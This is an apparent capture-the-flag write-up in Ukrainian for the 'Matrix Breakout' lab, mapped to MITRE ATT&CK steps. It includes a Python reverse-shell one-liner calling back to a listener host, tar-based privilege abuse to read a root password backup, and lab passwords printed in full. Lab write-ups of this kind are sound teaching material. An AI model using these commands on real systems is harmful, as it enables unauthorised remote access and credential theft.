# Matrix Breakout CTF

### 1. Reconnaissance: Active Scanning: Scanning IP Blocks(T1595.001)

Шукаємо IP машини за допомогою netdiscover

<img width="727" height="221" alt="image" src="https://github.com/user-attachments/assets/89429b6f-c2d7-41df-b4c4-3a68094437b8" />

Знайшли: 192.168.0.128

### 2. Reconnaissance: Active Scanning: Vulnerability Scanning(T1595.002)

Шукаємо порти

<img width="658" height="215" alt="image" src="https://github.com/user-attachments/assets/3f80c18f-e3eb-44cb-a2aa-0ee8d88e1fb5" />

### 3. Reconnaissance: Active Scanning: Wordlist Scanning(T1595.003)

Розпочнемо з простого: веб-сторiнка на порту 80

<img width="868" height="866" alt="image" src="https://github.com/user-attachments/assets/9ad7cd65-2c87-48d3-8ab0-1712d6d0862c" />

Шукаємо директорiї:

<img width="470" height="326" alt="image" src="https://github.com/user-attachments/assets/bb105a8e-4fdd-4fb4-9f28-c53f8051fe42" />

Знайшли "manual". Там лише мануали до apache. Шукаємо далi, переглянемо html-код

<img width="1039" height="220" alt="image" src="https://github.com/user-attachments/assets/48cfe7ee-23ff-4b5c-a5ab-a477d200696f" />

### 4. Credential Access: Unsecured Credentials: Credentials In Files(T1552.001)

Це код, написаний в brainfuck. Компiлюємо:

<img width="170" height="109" alt="image" src="https://github.com/user-attachments/assets/87cbd914-b06f-40a7-8acb-927df0939097" />

".2uqPEfj3D<P'a-3"

Виглядає як пароль

Зосталося лише знайти, до чого вiн

### 5. Discovery: Account Discovery: Domain/Local Account

Перевiримо iншi порти

Порти 10000 i 20000 ведуть до сторiнки входу до webmin i usermin

Шукаємо iм'я користувачiв

<img width="656" height="63" alt="image" src="https://github.com/user-attachments/assets/e31c7acb-55fc-4a76-adf9-3d486ec73f84" />

"cyber"

### 6. Initial Access: Valid Accounts + Exploit Public-Facing Application(T1078, T1190)

Входимо

<img width="660" height="530" alt="image" src="https://github.com/user-attachments/assets/eebdc9e6-caaf-4701-adde-42914f8a1ac8" />

Вдалося

### 7. Execution: Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Python(T1059.004, T1059.006)

<img width="346" height="191" alt="image" src="https://github.com/user-attachments/assets/a48f612b-5b10-4366-93d6-f241b9b67b5e" />

Маємо доступ до веб-термiналу

Треба отримати повноцiнний доступ. Запускаємо reverse shell

```bash
nc -lvp 11111
```

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.115",11111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img width="541" height="149" alt="image" src="https://github.com/user-attachments/assets/5c3ca880-e1fc-4fd6-a3dc-14702c66b8c1" />

Вдалося. Далi, шукаємо як отримати root. Перевiримо бiнарнi файли з пiдвищеними правами

<img width="395" height="257" alt="image" src="https://github.com/user-attachments/assets/0cc1ca8b-68cb-4a4b-9d4b-67121f6795ab" />

/home/cyber/tar має пiдвищенi права

### 8. Credential Access: Unsecured Credentials: Credentials In Files(T1552.001)

В /var/backups знаходимо бекап старого паролю, але потрiбен root. Можна використати /home/cyber/tar, щоб отримати до нього доступ

<img width="575" height="139" alt="image" src="https://github.com/user-attachments/assets/1901adf8-a02a-49da-9e79-a9cd1f9c21f7" />

```bash
./tar -cf password.tar /var/backups/.old_pass.bak
```

```bash
tar -xvf password.tar
```

```bash
cat /var/backups/.old_pass.bak
```

<img width="270" height="71" alt="image" src="https://github.com/user-attachments/assets/adf84f26-9c84-42f9-b51f-dab589f17874" />

8. Privilege Escalation: Valid Accounts: Local Accounts(T1078.003)


```bash
su root
```


```bash
Ts&4&YurgtRX(=~h
```

<img width="259" height="88" alt="image" src="https://github.com/user-attachments/assets/ecc679a1-1700-4b63-9ae1-b160c9fd679e" />

Шукаємо флаг

<img width="506" height="151" alt="image" src="https://github.com/user-attachments/assets/91cb1079-7de5-4d64-a1bf-d7170b3079c3" />


### Перемога!

<img width="720" height="500" alt="image" src="https://github.com/user-attachments/assets/354f2885-289d-45c4-8e07-d26adce10c92" />
